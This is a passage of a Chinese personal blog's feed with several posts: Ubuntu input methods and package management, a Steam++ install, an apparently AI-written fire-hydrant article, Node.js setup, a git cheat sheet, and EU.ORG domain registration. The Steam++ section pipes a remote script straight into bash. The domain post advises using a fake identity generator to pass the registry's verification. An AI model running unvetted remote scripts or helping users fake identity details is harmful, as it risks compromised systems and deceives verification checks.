class="meta prompt_"># </span><span class="language-bash">根据所需进行选择</span></span><br><span class="line">sudo apt-get install ibus-pinyin # IBus 拼音</span><br><span class="line">sudo apt-get install ibus-table-wubi # IBUS 五笔</span><br><span class="line">sudo apt-get install ibus-googlepinyin # 谷歌拼音</span><br><span class="line">sudo apt-get install ibus-sunpinyin # Sun 拼音</span><br></pre></td></tr></table></figure><p>在终端输入命令进入 ibus 配置界面：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ibus-setup</span><br></pre></td></tr></table></figure><p><s>在<code>Input Method</code>选项卡中选择自己喜欢的输入方式与快捷键。把 ibus 输入法添加到输入法栏后 Input Source 里面就有 Chinese 了。在<code>Add an Input Source</code>中将<code>Chinese(Intelligent Pinyin)</code>选中并在窗口右上角点击<code>Add</code>添加。</s></p><p>之后进入<code>Settings</code> -&gt; <code>Region &amp; Language</code>进行设置与启用（注：部分版本需要在设置中<code>键盘</code>选项卡配置）。</p><p>至此安装完成。在输入文字的地方点击右上角切换输入法即可使用。</p><h3 id="安装-GDebi">安装 GDebi</h3><blockquote><p>GDebi 是一个非常流行的软件包管理器，它提供了一个简单的方法来安装和卸载 deb 软件包，能识别 deb 包的依赖项并尝试同时安装它们。</p></blockquote><p>使用 Ubuntu 软件中心搜索<code>GDebi</code>，或使用命令安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gdebi</span><br></pre></td></tr></table></figure><p>之后可用右键单击下载的 deb 文件并选择用其他应用程序打开，从可用应用程序列表中选择 Gdebi 进行安装操作。也可以使用命令完成（假设你的文件名为<code>package.deb</code>，在磁盘根目录的<code>download</code>文件夹中）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gdebi /download/package.deb</span><br></pre></td></tr></table></figure><p>注：右键 deb 文件 -&gt; <code>属性</code> -&gt; <code>打开方式</code>可修改默认安装程序</p><h2 id="使用">使用</h2><h3 id="deb-包的安装与卸载">.deb 包的安装与卸载</h3><h4 id="安装">安装</h4><p>使用 dpkg 命令（假设你的文件名为<code>package.deb</code>，软件名为<code>program_name</code>，在磁盘根目录的<code>download</code>文件夹中）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i /download/package.deb # 请按照实际情况自行修改此处的路径</span><br></pre></td></tr></table></figure><p>若出现依赖错误可执行以下命令安装依赖：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -f</span><br></pre></td></tr></table></figure><p>运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">program_name # 请根据实际情况修改</span><br></pre></td></tr></table></figure><h4 id="卸载">卸载</h4><p>在终端输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg --list # 显示系统中安装的软件，以首字母排序</span><br></pre></td></tr></table></figure><p>查找到程序后在终端执行（假设你准备卸载的程序在此处显示名为<code>program_name</code>）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">以下命令二选一即可</span></span><br><span class="line">sudo apt-get remove program_name # 不删除配置文件</span><br><span class="line">sudo apt-get --purge remove program_name # 一并删除配置文件</span><br></pre></td></tr></table></figure><p>在终端输入 yes 确认删除并等待执行。</p><h4 id="更新">更新</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update # 更新可用软件包列表</span><br><span class="line">sudo apt-get upgrade  # 更新已安装的包</span><br><span class="line">sudo apt-get upgrade program_name # 更新名为&quot;program_name&quot;的软件</span><br><span class="line">sudo apt list --upgradable # 列出可更新的软件</span><br><span class="line">sudo apt-get dist-upgrade # 升级 Ubuntu 系统版本</span><br></pre></td></tr></table></figure><h2 id="附">附</h2><h3 id="Steam">Steam++</h3><p>（只是觉得这个软件加速 GitHub 和 Steam 比较方便和顺手罢了，但自己安装后因为种种原因未能配置成功）</p><h4 id="一键脚本">一键脚本</h4><p><a href="https://steampp.net/download" rel="external nofollow noreferrer">https://steampp.net/download</a><br>需要依赖 certutil,jq,zenity 工具</p><ul><li><code>certutil</code> 工具。初始化 nssdb 数据库，Chrome 信任该数据库</li><li><code>jq</code> 工具。解析更新接口自动获取下载地址。</li><li><code>zenity</code> 工具。图形化提示，显示下载进度。</li></ul><p>Linux 目前仅支持 x64 架构，Arm64 将在正式版提供支持</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://steampp.net/Install/Linux.sh | bash</span><br></pre></td></tr></table></figure><h4 id="手动下载">手动下载</h4><p>前往 GitHub 仓库<br><a href="https://github.com/BeyondDimension/SteamTools/releases" rel="external nofollow noreferrer">https://github.com/BeyondDimension/SteamTools/releases</a> 下载对应的包（Ubuntu 系统选择<code>.deb</code>），并放置于 Ubuntu 系统的磁盘中。</p><p>执行 dpkg 命令进行安装（假设你的文件名为<code>steamppdeb.deb</code>，软件名为<code>steampp</code>，在磁盘根目录的<code>download</code>文件夹中）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i /download/steamppdeb.deb # 请按照实际情况自行修改此处的路径</span><br></pre></td></tr></table></figure><p>若出现依赖错误可执行以下命令安装依赖：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -f</span><br></pre></td></tr></table></figure><p>运行软件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steampp</span><br></pre></td></tr></table></figure><h2 id="参考">参考</h2><blockquote><p><a href="https://zhuanlan.zhihu.com/p/355314438" rel="external nofollow noreferrer">https://zhuanlan.zhihu.com/p/355314438</a><br><a href="https://zhuanlan.zhihu.com/p/142014944" rel="external nofollow noreferrer">https://zhuanlan.zhihu.com/p/142014944</a><br><a href="https://zhuanlan.zhihu.com/p/132558860" rel="external nofollow noreferrer">https://zhuanlan.zhihu.com/p/132558860</a><br><a href="https://linux.cn/article-12183-1.html" rel="external nofollow noreferrer">https://linux.cn/article-12183-1.html</a><br><a href="https://linux.cn/article-12956-1.html" rel="external nofollow noreferrer">https://linux.cn/article-12956-1.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何使用小区内的消防栓</title>
      <link href="/posts/3695865278/"/>
      <url>/posts/3695865278/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>【注：本文同时兼做 AI 测试结果使用】</p><p>火灾常常是突如其来的，当人们面对火灾时，正确的应对方式是非常重要的。在小区内，消防栓是重要的灭火装置，居民们应当了解如何正确使用消防栓来应对火灾，以保护自己和他人的生命财产安全。</p><p>首先，面对火灾，居民们应当保持冷静，迅速报警并确保自身安全。当火灾发生时，立即拨打火警电话，通知相关部门前来扑灭火灾。同时，立即离开现场，避免留在火灾现场内，以保证自身安全。</p><p>接下来，居民们应当迅速前往小区内的消防栓位置。在很多小区内，消防栓通常设置在室外的固定位置，要尽快找到消防栓的位置。在前往消防栓的过程中，尽量避免接近火灾现场，确保自己的安全。</p><p>一旦找到消防栓，居民们应当根据消防栓上的指示使用消防栓。大部分的消防栓都会有一个控制开关，通常是一个阀门。在使用消防栓之前，要确保其他人已经报警，并且有人在场指挥灭火工作。打开消防栓后，要根据需要使用消防水枪或水带将水喷射到火源上。同时，要小心操作，避免因使用不当造成水压过大、喷头松动等情况，造成更大的危险。</p><p>在使用消防栓的过程中，也需要留意自身安全。要确保自己站在安全的位置上，避免火势蔓延而对自己造成危险。同时，要注意喷水的方向，避免喷水时伤到其他人或物品。</p><p>另外，要提醒居民们，消防栓是用来扑灭火灾的工具，而不是用来玩耍的。在没有火灾的情况下，不要私自打开消防栓进行水战等活动，以免影响消防栓的正常使用，也会给小区管理带来麻烦。</p><p>最后，一旦火灾得到控制，居民们要及时通知相关部门火势已被扑灭，并且要确保火势已经完全熄灭之后，再离开火灾现场。</p><p>总之，正确使用小区内的消防栓对于保护自己和他人的生命财产安全非常重要。当火灾发生时，居民们应当保持冷静，迅速报警并确保自身安全，正确使用消防栓来扑灭火灾。同时，也要注意不要滥用消防栓，保持消防设施的完好，为小区的火灾防范工作做出自己的贡献。</p>]]></content>
      
      
      <categories>
          
          <category> 摘录笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技巧 </tag>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Node.js 安装教程</title>
      <link href="/posts/3902219675/"/>
      <url>/posts/3902219675/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>起初是想尝试一个 js 写的 web 程序，然后嫌安装组件速度太慢，故换源。结果源没换好，反而因为输入了一些不该输入的东西，最终在我的一通猛如虎的操作之后……nodejs 崩了，Hexo 编译不了。尝试无数修复教程，通通无果，最终只得重新安装。以防哪天折腾再度“悲剧”，故在此记录安装过程。</p><p>当然更多的原因是现实中太忙，实在抽不出什么时间，环境出故障也没时间修复，<s>我不会也暂没能力花费过多精力维护与更新这个以兴趣为主的站点，更多是抱着探索的心态去对待</s>。</p><p>注：本篇以 Windows10 系统为例，系统用户名为<code>admin</code>；修改后的安装目录以<code>D:\nodejs\*</code>为例</p><p>如果像我一样决定重新安装 nodejs，建议先将其完全卸载（包括在 C 盘等路径下的相关目录），重启系统后再终端输入<code>npm</code>、<code>node</code>等 nodejs 相关指令，若显示不是可执行程序，则表明卸载成功。</p><h2 id="下载">下载</h2><p><a href="https://nodejs.org/" rel="external nofollow noreferrer">https://nodejs.org/</a></p><p>根据自己电脑系统及位数选择。界面中左侧为 LTS（长期稳定版），右侧为尝鲜版（相比而言不太稳定）。按钮默认<code>.msi</code>文件，如需下载其他版本，可点击按钮左下方的<code>Other Downloads</code>进行选择（注：点击后进入的页面，最底下有<code>Previous Releases</code>可下载历史版本）。</p><p>此处以 Windows 系统下<code>.msi</code>文件进行安装为例。</p><h2 id="安装">安装</h2><p>双击运行安装包，点击 next，之后点击同意许可。</p><p>选择安装路径。安装路径默认在<code>C:\Program Files</code>下，可自定义修改，例如<code>D:\nodejs\</code>。</p><p>下一步选择安装内容：</p><table><thead><tr><th>项目</th><th>作用</th></tr></thead><tbody><tr><td>Node.js runtime</td><td>表示运行环境</td></tr><tr><td>npm package manager</td><td>表示 npm 包管理器</td></tr><tr><td>online documentation shortcuts</td><td>在线文档快捷方式</td></tr><tr><td>Add to PATH</td><td>添加到环境变量</td></tr></tbody></table><p>之后是“安装编译本机模块所需的工具”，可不勾选。该页面大致含义如下：</p><blockquote><p>一些 npm 模块需要在安装时从 C/ c++编译。如果您希望能够安装这些模块，则需要安装一些工具 (Python 和 Visual Studio Build tools)。</p><ul><li>[ ] 自动安装必备工具。注意，这也将安装 Chocolatey。安装完成后，脚本将在一个新窗口中弹出。或者，按照 <a href="https://github.com/nodejs/node-gyp#on-windows" rel="external nofollow noreferrer">https://github.com/nodejs/node-gyp#on-windows</a> 上的说明自行安装依赖项。</li></ul></blockquote><p>最后点击<code>install</code>，等待完成后点击<code>finish</code>。</p><p>打开命令提示符，输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node -v :: 显示 node.js 版本</span><br><span class="line">npm -v :: 显示 npm 版本</span><br></pre></td></tr></table></figure><p>若正常显示版本号则说明安装成功。</p><h2 id="配置">配置</h2><h3 id="全局与缓存目录">全局与缓存目录</h3><p>.msi 格式的安装包已经将 node 主程序添加到系统环境变量 path 中。由于还有一些未自动配置（可能），部分内容位于 C 盘下可能导致 C 盘占用日益增长，且部分用户希望统一管理 node 包，故这部分还需手动配置。</p><p>找到安装的目录（例如前文的<code>D:\nodejs\</code>，其他目录同理。后文若无其他说明则以此目录为例），在安装目录下新建<code>node_global</code>和<code>node_cache</code>两个文件夹。</p><p><img src="https://s2.loli.net/2024/02/05/NkOZB9zSQeKfwxV.png" alt=""></p><p>打开 cmd 命令窗口（最好使用管理员权限），输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> prefix <span class="string">&quot;D:\nodejs\node_global&quot;</span> <span class="comment"># 前面创建的“node_global”文件夹路径，设置包的全局安装目录</span></span><br><span class="line">npm config <span class="built_in">set</span> cache <span class="string">&quot;D:\nodejs\node_cache&quot;</span> <span class="comment"># 前面创建的“node_cache”文件夹路径，设置包的缓存目录</span></span><br></pre></td></tr></table></figure><h3 id="系统环境变量">系统环境变量</h3><p>以下几种方法均可进入系统环境变量设置。</p><ol><li>右键<code>此电脑</code>图标 -&gt; <code>属性</code> -&gt; <code>高级系统设置</code> -&gt; <code>环境变量</code></li><li>点击<code>控制面板</code> -&gt; <code>系统和安全</code> -&gt; <code>系统</code> -&gt; 进入设置，找到最底下<code>相关设置</code>的<code>高级系统设置</code> -&gt; <code>环境变量</code></li><li>进入<code>设置</code> -&gt; <code>系统</code> -&gt; <code>关于</code>，之后同方法<code>2</code></li></ol><p>在<code>环境变量</code>中进行以下配置（图中相关内容已修改/添加完成）：</p><ol><li>在<code>admin 的用户变量 (U)</code>下找到变量<code>Path</code>，点击下方<code>编辑</code>按钮，找到类似于<code>C:\Users\admin\AppData\Roaming\npm</code>的项，将其修改为<code>D:\nodejs\node_global</code>，之后点击确定。</li></ol><p><img src="https://s2.loli.net/2024/02/05/WXzRtIspTlJHBnx.png" alt=""></p><ol start="2"><li>在<code>系统变量 (S)</code>下方找到并点击<code>新建</code>，添加<code>变量名</code>为<code>NODE_PATH</code>、<code>变量值</code>为<code>D:\nodejs\node_global\node_modules</code>，点击确定。此时如果在<code>变量值</code>填写的目录下没有<code>node_modules</code>文件夹，可自行创建。</li></ol><p><img src="https://s2.loli.net/2024/02/05/Eu531dBIUSig7H4.png" alt=""></p><ol start="3"><li>在<code>系统变量 (S)</code>下方找到<code>Path</code>并点击下方<code>编辑</code>按钮，点击弹出窗口右侧的<code>新建</code>按钮，添加<code>%NODE_PATH%</code>后点下方<code>确定</code>。（如果你发现你的 msi 安装包没有帮你配置 node 启动程序变量，或是后续变更了 node 安装目录，请新建<code>D:\nodejs\</code>，或修改此处显示的 nodejs 目录）</li></ol><p><img src="https://s2.loli.net/2024/02/05/gJfD386WRUA1Hxk.png" alt=""></p><p>通常情况下这样便配置完成。</p><h2 id="测试">测试</h2><blockquote><p>Express.js 是一个简单而灵活的 Node.js 网页应用框架，它为网页和手机应用提供了强大的功能集。它提供了带 HTTP 工具方法和中间件的 API，使用 Express 可以快速地搭建一个具有完整功能的网站。</p></blockquote><p>通常在配置完后为验证生效会安装这个框架进行测试（装其他组件也行，此处目的是验证配置成功与否）。打开终端输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install express -g <span class="comment"># 安装 express.js，全局</span></span><br></pre></td></tr></table></figure><p>若出现像<code>added xxx packages in xs</code>等不像报错的输出内容，则表明安装成功，也表明前面的配置成功生效。</p><p>没权限可右键<code>D:\nodejs\</code>文件夹 -&gt; <code>属性</code> -&gt; <code>安全</code> -&gt; <code>编辑</code>，将所有权限都设为允许；也可以使用管理员身份打开 CMD</p><h2 id="换源（可选）">换源（可选）</h2><p>由于众所周知的原因，原始的<code>https://registry.npmjs.com</code>在国内速度不稳定，可更换为<code>https://registry.npmmirror.com</code>（愿 taobao 镜像源）</p><p>打开终端输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry https://registry.npmmirror.com</span><br></pre></td></tr></table></figure><p>之后输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config get registry</span><br></pre></td></tr></table></figure><p>验证更换是否成功。</p><blockquote><p>不行，这速度还是太慢，我不满意！</p></blockquote><p>全局安装 cnpm</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g cnpm --registry=https://registry.npmmirror.com</span><br></pre></td></tr></table></figure><p>之后输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm -v</span><br></pre></td></tr></table></figure><p>若正常显示则表明 cnpm 安装成功。</p><p>建议安装删除包时使用 cnpm 快些，其他时候仍使用 npm。</p><h2 id="参考：">参考：</h2><blockquote><p><a href="https://www.runoob.com/nodejs/nodejs-install-setup.html" rel="external nofollow noreferrer">https://www.runoob.com/nodejs/nodejs-install-setup.html</a><br><a href="https://zhuanlan.zhihu.com/p/442215189" rel="external nofollow noreferrer">https://zhuanlan.zhihu.com/p/442215189</a><br><a href="https://blog.csdn.net/WHF__/article/details/129362462" rel="external nofollow noreferrer">https://blog.csdn.net/WHF__/article/details/129362462</a><br><a href="https://npmmirror.com/" rel="external nofollow noreferrer">https://npmmirror.com/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令 </tag>
            
            <tag> nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git 常用命令速查</title>
      <link href="/posts/966087952/"/>
      <url>/posts/966087952/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>来源：</p><p><a href="https://gist.github.com/guweigang/9848271" rel="external nofollow noreferrer">https://gist.github.com/guweigang/9848271</a><br><a href="https://www.runoob.com/note/56524" rel="external nofollow noreferrer">https://www.runoob.com/note/56524</a></p><table><thead><tr><th>命令</th><th>释义</th></tr></thead><tbody><tr><td>git init</td><td># 初始化本地 git 仓库（创建新仓库）</td></tr><tr><td>git config --global <a href="http://user.name" rel="external nofollow noreferrer">user.name</a> “xxx”</td><td># 配置用户名</td></tr><tr><td>git config --global user.email “<a href="mailto:xxx@xxx.com" rel="external nofollow noreferrer">xxx@xxx.com</a>”</td><td># 配置邮件</td></tr><tr><td>git config --global color.ui true</td><td># git status 等命令自动着色</td></tr><tr><td>git config --global color.status auto</td><td>~</td></tr><tr><td>git config --global color.diff auto</td><td>~</td></tr><tr><td>git config --global color.branch auto</td><td>~</td></tr><tr><td>git config --global color.interactive auto</td><td>~</td></tr><tr><td>git config --global --unset http.proxy</td><td># remove  proxy configuration on git</td></tr><tr><td>git clone git+ssh://git@192.168.53.168/VT.git</td><td># clone 远程仓库</td></tr><tr><td>git status</td><td># 查看当前版本状态（是否修改）</td></tr><tr><td>git add xyz</td><td># 添加 xyz 文件至 index</td></tr><tr><td>git add .</td><td># 增加当前子目录下所有更改过的文件至 index</td></tr><tr><td>git commit -m ‘xxx’</td><td># 提交</td></tr><tr><td>git commit --amend -m ‘xxx’</td><td># 合并上一次提交（用于反复修改）</td></tr><tr><td>git commit -am ‘xxx’</td><td># 将 add 和 commit 合为一步</td></tr><tr><td>git rm xxx</td><td># 删除 index 中的文件</td></tr><tr><td>git rm -r *</td><td># 递归删除</td></tr><tr><td>git log</td><td># 显示提交日志</td></tr><tr><td>git log -1</td><td># 显示 1 行日志 -n 为 n 行</td></tr><tr><td>git log -5</td><td>~</td></tr><tr><td>git log --stat</td><td># 显示提交日志及相关变动文件</td></tr><tr><td>git log -p -m</td><td>~</td></tr><tr><td>git show dfb02e6e4f2f7b573337763e5c0013802e392818</td><td># 显示某个提交的详细内容</td></tr><tr><td>git show dfb02</td><td># 可只用 commitid 的前几位</td></tr><tr><td>git show HEAD</td><td># 显示 HEAD 提交日志</td></tr><tr><td>git show HEAD^</td><td># 显示 HEAD 的父（上一个版本）的提交日志 ^^为上两个版本 ^5 为上 5 个版本</td></tr><tr><td>git tag</td><td># 显示已存在的 tag</td></tr><tr><td>git tag -a v2.0 -m ‘xxx’</td><td># 增加 v2.0 的 tag</td></tr><tr><td>git show v2.0</td><td># 显示 v2.0 的日志及详细内容</td></tr><tr><td>git log v2.0</td><td># 显示 v2.0 的日志</td></tr><tr><td>git diff</td><td># 显示所有未添加至 index 的变更</td></tr><tr><td>git diff --cached</td><td># 显示所有已添加 index 但还未 commit 的变更</td></tr><tr><td>git diff HEAD^</td><td># 比较与上一个版本的差异</td></tr><tr><td>git diff HEAD – ./lib</td><td># 比较与 HEAD 版本 lib 目录的差异</td></tr><tr><td>git diff origin/master…master</td><td># 比较远程分支 master 上有本地分支 master 上没有的</td></tr><tr><td>git diff origin/master…master --stat</td><td># 只显示差异的文件，不显示具体内容</td></tr><tr><td>git difftool</td><td># 调用图形化差异比较工具</td></tr><tr><td>git remote add origin git+ssh://git@192.168.53.168/VT.git</td><td># 增加远程定义（用于 push/pull/fetch）</td></tr><tr><td>git branch</td><td># 显示本地分支</td></tr><tr><td>git branch --contains 50089</td><td># 显示包含提交 50089 的分支</td></tr><tr><td>git branch -a</td><td># 显示所有分支</td></tr><tr><td>git branch -r</td><td># 显示所有原创分支</td></tr><tr><td>git branch --merged</td><td># 显示所有已合并到当前分支的分支</td></tr><tr><td>git branch --no-merged</td><td># 显示所有未合并到当前分支的分支</td></tr><tr><td>git branch -m master master_copy</td><td># 本地分支改名</td></tr><tr><td>git checkout -b master_copy</td><td># 从当前分支创建新分支 master_copy 并检出</td></tr><tr><td>git checkout -b master master_copy</td><td># 上面的完整版</td></tr><tr><td>git checkout features/performance</td><td># 检出已存在的 features/performance 分支</td></tr><tr><td>git checkout --track hotfixes/BJVEP933</td><td># 检出远程分支 hotfixes/BJVEP933 并创建本地跟踪分支</td></tr><tr><td>git checkout v2.0</td><td># 检出版本 v2.0</td></tr><tr><td>git checkout -b devel origin/develop</td><td># 从远程分支 develop 创建新本地分支 devel 并检出</td></tr><tr><td>git checkout – README</td><td># 检出 head 版本的 README 文件（可用于修改错误回退）</td></tr><tr><td>git merge origin/master</td><td># 合并远程 master 分支至当前分支</td></tr><tr><td>git cherry-pick ff44785404a8e</td><td># 合并提交 ff44785404a8e 的修改</td></tr><tr><td>git push origin master</td><td># 将当前分支 push 到远程 master 分支</td></tr><tr><td>git push origin :hotfixes/BJVEP933</td><td># 删除远程仓库的 hotfixes/BJVEP933 分支</td></tr><tr><td>push origin --delete branch-name</td><td></td></tr><tr><td># 当前名为 branch-name 的分支</td><td></td></tr><tr><td>git push --tags</td><td># 把所有 tag 推送到远程仓库</td></tr><tr><td>git fetch</td><td># 获取所有远程分支（不更新本地分支，另需 merge）</td></tr><tr><td>git fetch --prune</td><td># 获取所有原创分支并清除服务器上已删掉的分支</td></tr><tr><td>git pull origin master</td><td># 获取远程分支 master 并 merge 到当前分支</td></tr><tr><td>git mv README README2</td><td># 重命名文件 README 为 README2</td></tr><tr><td>git reset --hard HEAD</td><td># 将当前版本重置为 HEAD（通常用于 merge 失败回退）</td></tr><tr><td>git rebase</td><td>~</td></tr><tr><td>git branch -d hotfixes/BJVEP933</td><td># 删除分支 hotfixes/BJVEP933（本分支修改已合并到其他分支）</td></tr><tr><td>git branch -D hotfixes/BJVEP933</td><td># 强制删除分支 hotfixes/BJVEP933</td></tr><tr><td>git ls-files</td><td># 列出 git index 包含的文件</td></tr><tr><td>git show-branch</td><td># 图示当前分支历史</td></tr><tr><td>git show-branch --all</td><td># 图示所有分支历史</td></tr><tr><td>git whatchanged</td><td># 显示提交历史对应的文件修改</td></tr><tr><td>git revert dfb02e6e4f2f7b573337763e5c0013802e392818</td><td># 撤销提交 dfb02e6e4f2f7b573337763e5c0013802e392818</td></tr><tr><td>git ls-tree HEAD</td><td># 内部命令：显示某个 git 对象</td></tr><tr><td>git rev-parse v2.0</td><td># 内部命令：显示某个 ref 对于的 SHA1 HASH</td></tr><tr><td>git reflog</td><td># 显示所有提交，包括孤立节点</td></tr><tr><td>git show HEAD@{5}</td><td>~</td></tr><tr><td>git show master@{yesterday}</td><td># 显示 master 分支昨天的状态</td></tr><tr><td>git log --pretty=format:‘%h %s’ --graph</td><td># 图示提交日志</td></tr><tr><td>git show HEAD~3</td><td>~</td></tr><tr><td>git show -s --pretty=raw 2be7fcb476</td><td>~</td></tr><tr><td>git stash</td><td># 暂存当前修改，将所有至为 HEAD 状态</td></tr><tr><td>git stash list</td><td># 查看所有暂存</td></tr><tr><td>git stash show -p stash@{0}</td><td># 参考第一次暂存</td></tr><tr><td>git stash apply stash@{0}</td><td># 应用第一次暂存</td></tr><tr><td>git grep “delete from”</td><td># 文件中搜索文本“delete from”</td></tr><tr><td>git grep -e ’</td><td>#define’ --and -e SORT_DIRENT</td></tr><tr><td>git gc</td><td>~</td></tr><tr><td>git fsck</td><td>~</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 摘录笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
            <tag> 命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>申请免费的 EU.ORG 域名</title>
      <link href="/posts/744863573/"/>
      <url>/posts/744863573/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>弄个自己的域名，<s>无论运营还是</s>测试使用会很方便。Freenom 供 tk、ga、ml、cf、gq 免费顶级域名有五，使无数草根站长趋之若鹜。</p><p>吾曾尝试良久，结果无一成功。近日欲再战 Freenom，却见“由于技术问题，新注册的 Freenom 申请暂时出现故障”。见 Freenom 的 whois 服务亦故障许久，于是想起 Meta 指控 Freenom 无视滥用投诉与将这些域名流量货币化，在美国起诉了它。</p><p>注册免费顶级域名在 Freenom 是没指望了，况且在那注册的域名也不稳定，流量大了被收回也是常有之事。不考虑 Freenom，免费顶级域名基本没戏，那……二级域名，总能成吧？</p><h2 id="需要注意的">需要注意的</h2><p>它注册是人工审核，等上一两个月乃至更久都是正常的。等不及的可以自行另尝试<code>pp.ua</code>、<code>co.uk</code>、<code>biz.nf</code>、<code>hz.cz</code>等。</p><p>你可能看到有些人注册完几小时就用上了，那是极为少见的情况。</p><p>（2024.7 更新）最近好像有个 <a href="https://nic.us.kg/" rel="external nofollow noreferrer">us.kg</a> 二级域名是免费可注册的，也可以使用 CF 托管。<code>eu.org</code>已经很久没有审批了，对于有需求的人而言，这也是个可用的选择。不过有段时间进行了限制（估计是注册人数过多），要 KYC 认证（最近好像又不用了？）。</p><p>最快捷的方法是准备一个邮箱（Gmail 这类首选，国内可用 163）、一个 GitHub 账户（过验证用，不能太新，起码要有几个自己的仓库，克隆的也行，然后多关注几个人）、一个合适的 <a href="https://www.meiguodizhi.com/uk-address" rel="external nofollow noreferrer">身份信息生成器</a>，然后跟着网页走就行。也可以不用 GitHub 验证，将注册时输入的信息录入到记事本中，然后截图提交，也能过 AI 审核：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Name:xxx</span><br><span class="line">Email:xxx</span><br><span class="line">Phone:xxx</span><br><span class="line">Address:xxx</span><br></pre></td></tr></table></figure><p>为了保险起见，同时考虑到稳定性，建议准备一个非新注册的 GitHub 账户。该二级域名很适合用于学习和测试，而且国内阻断情况好于 <a href="http://eu.org" rel="external nofollow noreferrer">eu.org</a>（以后说不准）。（但正因为这样，它已经数次遭到注册局的限制。）</p><p>不过由于某些原因，我不打算在此更详细介绍它。</p><hr><h2 id="这是什么">这是什么</h2><p><strong><a href="http://EU.ORG" rel="external nofollow noreferrer">EU.ORG</a> 免费域名！</strong></p><blockquote><p>“Companies have voted with their feet [on the issue of domains], they want to have domain names that are international or at least country neutral. The same freedom should apply to individuals; all individuals should be able to have and own their own domain names”.<br>——<em>Paul Mockapetris, creator of the DNS, in On the Internet, September/October 1996.</em></p></blockquote><p>这是一个欧盟组织下面的域名，由 Paul Mockapetris 在 1996 年创建了这个域名的 DNS 服务器，计划专门给无力承担费用的一些组织使用，因此它对个人和组织而言是免费注册的。虽然是二级域名，但目前已经被谷歌，Cloudflare 等一些大公司认可为顶级域名（并非全部，例如阿里就不这么认为）。</p><h2 id="准备">准备</h2><ul><li>邮箱（最好是 gmail、outlook、163 之类的）</li><li>浏览器</li></ul><p>注：文中填入自定义域名的地方以<code>www.example.com</code>及其变形形式代替。</p><h2 id="申请流程">申请流程</h2><p>打开 <a href="https://nic.eu.org/" rel="external nofollow noreferrer">https://nic.eu.org/</a>（看着很简陋，但这就是它的官网），找到<code>Sign-in or sign-up 